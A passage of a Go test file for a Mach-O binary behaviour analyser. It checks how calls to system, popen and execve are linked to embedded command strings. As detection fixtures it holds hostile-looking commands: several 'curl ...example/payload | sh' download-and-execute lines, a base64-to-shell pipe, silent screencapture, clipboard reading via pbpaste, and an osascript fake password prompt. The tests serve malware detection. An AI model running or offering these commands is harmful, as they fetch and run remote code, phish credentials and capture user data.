	if len(withoutDestination.Network) != 1 || withoutDestination.Network[0].Kind != behavior.NetworkImplementationAPICall || len(withoutDestination.Network[0].OperationIDs) != 0 {
		t.Fatalf("connect should retain a socket primitive and separately typed unbound network observation: operations=%#v network=%#v", withoutDestination.Operations, withoutDestination.Network)
	}

	var withURLOnly behavior.Graph
	addMachOStringXref(&withURLOnly, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "url", Value: "https://example.invalid/socket"},
	})
	addOperationFromCalledImportedSymbol(&withURLOnly, content, "_connect", "x86_64", "ev-connect", function)
	assertUnresolvedNativePrimitive(t, &withURLOnly, behavior.OperationSocketConnect, behavior.ResourceSocket)
	if len(withURLOnly.Network) != 1 {
		t.Fatalf("a URL xref is not sockaddr evidence for raw connect: operations=%#v network=%#v", withURLOnly.Operations, withURLOnly.Network)
	}

	var withDestination behavior.Graph
	addMachOStringXref(&withDestination, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "ip", Value: "203.0.113.8"},
	})
	addOperationFromCalledImportedSymbol(&withDestination, content, "_connect", "x86_64", "ev-connect", function)
	assertUnresolvedNativePrimitive(t, &withDestination, behavior.OperationSocketConnect, behavior.ResourceSocket)
	if len(withDestination.Network) != 1 {
		t.Fatalf("same-function IP xref must not become sockaddr provenance: operations=%#v network=%#v", withDestination.Operations, withDestination.Network)
	}
	called := withDestination.Network[0]
	if !stringSliceContains(called.UnresolvedProperties, "port") || !stringSliceContains(called.UnresolvedProperties, "destination") || !stringSliceContains(called.UnresolvedProperties, "sockaddr-to-IP binding") {
		t.Fatalf("called connect should retain unresolved socket semantics: %#v", called)
	}
}

func TestMachOCalledProcessAPIIgnoresProcessPathXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "other"},
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/usr/bin/curl",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/usr/bin/curl"},
		},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_execve", "x86_64", "ev-call", machoFunction{Name: "runHelper", Reachable: true})

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("process operation should not use process path xref from another function: %#v", graph.Operations)
	}
}

func TestMachOCalledProcessAPILeavesMultipleProcessPathXrefsUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runHelper", Reachable: true}
	for i, value := range []string{"/bin/sh", "/tmp/payload"} {
		addMachOStringXref(&graph, content, "x86_64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: function,
			Literal: machoStringLiteral{
				VA:       0x3000 + uint64(i),
				Offset:   80 + i,
				Kind:     "process-launch-path",
				Value:    value,
				Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: value},
			},
		})
	}
	addOperationFromCalledImportedSymbol(&graph, content, "_posix_spawn", "x86_64", "ev-call", function)

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("multiple process path xrefs should leave process operation generic: %#v", graph.Operations)
	}
}

func TestMachOCalledSystemDoesNotExpandUnprovenSameFunctionCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:     0x3000,
			Offset: 80,
			Kind:   "shell-command",
			Value:  "curl https://system.example/payload | sh",
		},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_system", "x86_64", "ev-call", function)

	if hasOperationKind(&graph, behavior.OperationNetworkDownload) || hasOperationKind(&graph, behavior.OperationInterpreterInvoke) || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("same-function command co-occurrence was treated as the system argument: operations=%#v relations=%#v", graph.Operations, graph.Relations)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("called system should remain an unresolved neutral process operation: %#v", graph.Operations)
	}
}

func TestMachOCalledSystemExpandsLiteralScreencaptureCommand(t *testing.T) {
	command := "screencapture -x -t png -C %s 2>/dev/null"
	if !looksShellCommandLiteral(command) {
		t.Fatalf("screencapture command should be retained as a shell-command candidate")
	}

	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "capture", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: command},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_system", "x86_64", "ev-call", function, machoCallContext{Argument0String: command})

	if !hasOperation(&graph, "screen.capture", "screenshot", "", "capture") {
		t.Fatalf("literal screencapture command reached by system should create a screenshot operation: %#v", graph.Operations)
	}
	for _, operation := range graph.Operations {
		if operation.Kind != "screen.capture" {
			continue
		}
		if !stringSliceContains(operation.EvidenceIDs, "ev-call") || len(operation.EvidenceIDs) < 2 {
			t.Fatalf("expanded screenshot operation must retain command-xref and called-system proof: %#v", operation)
		}
		if operation.Architecture != "x86_64" {
			t.Fatalf("native shell expansion must set architecture before operation retention: %#v", operation)
		}
	}
}

func TestMachOShellCommandLiteralRejectsBase64LibraryProse(t *testing.T) {
	for _, value := range []string{
		"base64 is always valid HeaderValue hyper response error",
		"base64 decoding uses the standard alphabet and padding",
	} {
		if looksShellCommandLiteral(value) {
			t.Fatalf("library prose was classified as a shell command: %q", value)
		}
	}
	for _, value := range []string{
		"base64 -D /tmp/input.b64",
		"base64 ./payload.txt",
		"base64 </tmp/input | /bin/sh",
	} {
		if !looksShellCommandLiteral(value) {
			t.Fatalf("command-shaped base64 literal was rejected: %q", value)
		}
	}
}

func TestMachONativeOSAScriptExpansionInheritsFunctionArchitecture(t *testing.T) {
	command := `osascript -e 'display dialog "Password:" default answer "" with hidden answer'`
	if !looksShellCommandLiteral(command) {
		t.Fatalf("osascript command should be retained as a shell-command candidate")
	}
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "prompt", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: command},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_system", "x86_64", "ev-call", function, machoCallContext{Argument0String: command})

	foundDerivedEvidence := false
	for _, evidence := range graph.Evidence {
		if evidence.Kind != "osascript-snippet" {
			continue
		}
		foundDerivedEvidence = true
		if evidence.ScopeID == "" || evidence.Arch != "x86_64" || evidence.Function != "prompt" {
			t.Fatalf("derived osascript evidence lost typed function context: %#v", evidence)
		}
	}
	if !foundDerivedEvidence {
		t.Fatalf("native osascript command did not produce delegated evidence: %#v", graph.Evidence)
	}
	foundPrompt := false
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationCredentialPrompt {
			continue
		}
		foundPrompt = true
		if operation.ScopeID == "" || operation.Architecture != "x86_64" || operation.SourceFunction != "prompt" {
			t.Fatalf("derived osascript operation lost typed function context: %#v", operation)
		}
	}
	if !foundPrompt {
		t.Fatalf("native osascript command did not retain the neutral prompt operation: %#v", graph.Operations)
	}
}

func TestMachONativeShellExpansionReservesCallProofAtEvidenceCap(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "capture", Reachable: true}
	scopeID := graph.AddScope(behavior.Scope{NodeID: content.NodeID, Kind: "function", Function: function.Name, Architecture: "x86_64"})
	command := "screencapture -x /tmp/cap.png"
	for i := 0; i < maxMachOCorrelatedOperationEvidence*4; i++ {
		graph.AddFeature(behavior.Feature{
			NodeID:         content.NodeID,
			ScopeID:        scopeID,
			Architecture:   "x86_64",
			Key:            "macho.shell_command",
			Value:          command,
			EvidenceIDs:    []string{fmt.Sprintf("ev-command-%03d", i)},
			Support:        behavior.SupportCorroborated,
			SourceFunction: function.Name,
		})
	}
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_system", "x86_64", "ev-call", function, machoCallContext{Argument0String: command})

	foundScreenshot := false
	for _, operation := range graph.Operations {
		if operation.Kind != "screen.capture" {
			continue
		}
		foundScreenshot = true
		if !stringSliceContains(operation.EvidenceIDs, "ev-call") || len(operation.EvidenceIDs) != maxShellOperationEvidenceIDs {
			t.Fatalf("bounded expanded operation must reserve called-system proof: %#v", operation)
		}
	}
	if !foundScreenshot {
		t.Fatal("missing screenshot operation from native shell expansion")
	}
	foundMarker := false
	for _, feature := range graph.Features {
		if feature.Key != "macho.shell_command_expanded" {
			continue
		}
		foundMarker = true
		if !stringSliceContains(feature.EvidenceIDs, "ev-call") || len(feature.EvidenceIDs) != maxMachOCorrelatedOperationEvidence {
			t.Fatalf("bounded expansion marker must reserve called-system proof: %#v", feature)
		}
	}
	if !foundMarker {
		t.Fatal("missing native shell expansion marker")
	}
}

func TestMachOCalledPopenExpandsSameFunctionShellCommandXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: "curl https://popen.example/payload | sh"},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_popen", "x86_64", "ev-call", function, machoCallContext{Argument0String: "curl https://popen.example/payload | sh"})

	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 || !hasRelationKind(graph.Relations, behavior.RelationPipesTo) {
		t.Fatalf("same-function popen command should produce download-to-interpreter chain: %#v", graph.Relations)
	}
	if !hasOperation(&graph, "network.download", "network-destination", "https://popen.example/payload", "runShell") {
		t.Fatalf("missing function-scoped network download from popen command: %#v", graph.Operations)
	}
}

func TestMachOCalledPopenExpandsBarePbpaste(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "readClipboard", Reachable: true}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: "pbpaste"},
	})
	addOperationFromCalledImportedSymbolWithContext(&graph, content, "_popen", "arm64", "ev-call", function, machoCallContext{Argument0String: "pbpaste"})

	if !hasOperationWithArch(&graph, "clipboard.read", "clipboard", "pbpaste", "readClipboard", "arm64") {
		t.Fatalf("called popen with literal pbpaste should create clipboard collection: %#v", graph.Operations)
	}
}

func TestArm64DirectNativeShellCallUsesArgumentCommandWhenFunctionHasMultipleCommands(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Start: 0x100000000, End: 0x10000000c, Reachable: true}
	argCommand := "curl https://arg-arm64.example/payload | sh"
	otherCommand := "curl https://other-arm64.example/payload | sh"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100002000, Offset: 0x2000, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000004,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100003000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x100000008, 0x100000100))
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x100002000, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x100003000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_system"}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://arg-arm64.example/payload", "runShell", "arm64") {
		t.Fatalf("native shell call should use the exact arm64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-arm64.example/payload", "runShell", "arm64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestArm64DirectNativeShellCallPropagatesMovedArgumentRegister(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Start: 0x100000000, End: 0x100000010, Reachable: true}
	argCommand := "curl https://moved-arm64.example/payload | sh"
	otherCommand := "curl https://other-moved-arm64.example/payload | sh"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100002000, Offset: 0x2000, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000004,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100003000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(3, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(3, 3, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestMOVRegister(0, 3))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestBL(0x10000000c, 0x100000100))
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x100002000, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x100003000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_system"}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://moved-arm64.example/payload", "runShell", "arm64") {
		t.Fatalf("native shell call should propagate moved arm64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-moved-arm64.example/payload", "runShell", "arm64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestArm64DirectNativeShellCallDoesNotReuseCommandAfterArgumentOverwrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Start: 0x100000000, End: 0x100000010, Reachable: true}
	firstCommand := "curl https://stale-arm64.example/payload | sh"
	secondCommand := "curl https://other-stale-arm64.example/payload | sh"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100002000, Offset: 0x2000, Kind: "shell-command", Value: firstCommand},
	})
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000004,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x100003000, Offset: 0x3000, Kind: "shell-command", Value: secondCommand},
	})
	data := make([]byte, 16)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestMOVRegister(0, 1))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestBL(0x10000000c, 0x100000100))
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x100002000, append([]byte(firstCommand), 0)),
			testMachOSection("__cstring", 0x100003000, append([]byte(secondCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_system"}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if hasOperationKind(&graph, "network.download") || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("overwritten x0 should not produce shell expansion: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestX86DirectNativeShellCallUsesArgumentCommandWhenFunctionHasMultipleCommands(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	argCommand := "curl https://arg-x86.example/payload | sh"
	otherCommand := "curl https://other-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x100c, Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1007,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	lea := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, 0x2000)
	call := encodeTestX86CALL(0x1000+uint64(len(lea)), 0x1100)
	data := append(lea, call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2000, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_popen"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should use the exact x86_64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestX86DirectNativeShellCallPropagatesMovedArgumentRegister(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	argCommand := "curl https://moved-x86.example/payload | sh"
	otherCommand := "curl https://other-moved-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1010, Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1007,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	lea := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	mov := encodeTestX86MOVReg(7, 0)
	callVA := 0x1000 + uint64(len(lea)+len(mov))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(lea, mov...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2000, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://moved-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should propagate moved x86_64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-moved-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestX86DirectNativeShellCallUsesBaseRelativeArgumentCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	argCommand := "curl https://base-arg-x86.example/payload | sh"
	otherCommand := "curl https://other-base-arg-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1020, Reachable: true}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaArg := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	callVA := 0x1000 + uint64(len(leaBase)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)),
		Function: function,
		Literal:  machoStringLiteral{VA: 0x2040, Offset: 0x2040, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)+len(leaArg)),
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	data := append(append(leaBase, leaArg...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2040, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://base-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should recover base-relative x86_64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-base-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestX86DirectNativeShellCallUsesSIBBaseRelativeArgumentCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	argCommand := "curl https://sib-base-arg-x86.example/payload | sh"
	otherCommand := "curl https://other-sib-base-arg-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1020, Reachable: true}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaArg := encodeTestX86SIBBaseDisp8(0x8d, 7, 0, 0x40, 4)
	callVA := 0x1000 + uint64(len(leaBase)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)),
		Function: function,
		Literal:  machoStringLiteral{VA: 0x2040, Offset: 0x2040, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    callVA,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: otherCommand},
	})
	data := append(append(leaBase, leaArg...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2040, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://sib-base-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should recover SIB base-relative x86_64 argument command: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-sib-base-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestX86DirectNativeShellCallUsesBaseNoDispPointerArgumentCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	argCommand := "curl https://base-nodisp-arg-x86.example/payload | sh"
	otherCommand := "curl https://other-base-nodisp-arg-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1020, Reachable: true}
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, 0x3000)
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	movArg := encodeTestX86BaseNoDisp(0x8b, 7, 0)
	callVA := 0x1000 + uint64(len(leaBase)+len(movArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)),
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: argCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    callVA,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x4000, Offset: 0x4000, Kind: "shell-command", Value: otherCommand},
	})
	data := append(append(leaBase, movArg...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__const", 0x2000, pointerData),
			testMachOSection("__cstring", 0x3000, append([]byte(argCommand), 0)),
			testMachOSection("__cstring", 0x4000, append([]byte(otherCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "network.download", "network-destination", "https://base-nodisp-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should recover no-displacement base pointer argument: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "network.download", "network-destination", "https://other-base-nodisp-arg-x86.example/payload", "runShell", "x86_64") {
		t.Fatalf("native shell call should not expand non-argument command: %#v", graph.Operations)
	}
}

func TestX86DirectNativeShellCallDoesNotReuseBaseAcrossFunctionBoundary(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selected := "curl https://cross-function-base-arg.example/payload | sh"
	other := "curl https://other-cross-function-base-arg.example/payload | sh"
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	leaArg := encodeTestX86BaseDisp8(0x8d, 7, 0, 0x40)
	callVA := 0x1000 + uint64(len(leaBase)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(leaBase, leaArg...), call...)
	functions := []machoFunction{
		{Name: "setBase", Start: 0x1000, End: 0x1000 + uint64(len(leaBase)), Reachable: true},
		{Name: "runShell", Start: 0x1000 + uint64(len(leaBase)), End: 0x1000 + uint64(len(data)), Reachable: true},
	}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)),
		Function: functions[1],
		Literal:  machoStringLiteral{VA: 0x2040, Offset: 0x2040, Kind: "shell-command", Value: selected},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)+len(leaArg)),
		Function: functions[1],
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: other},
	})
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2040, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(other), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

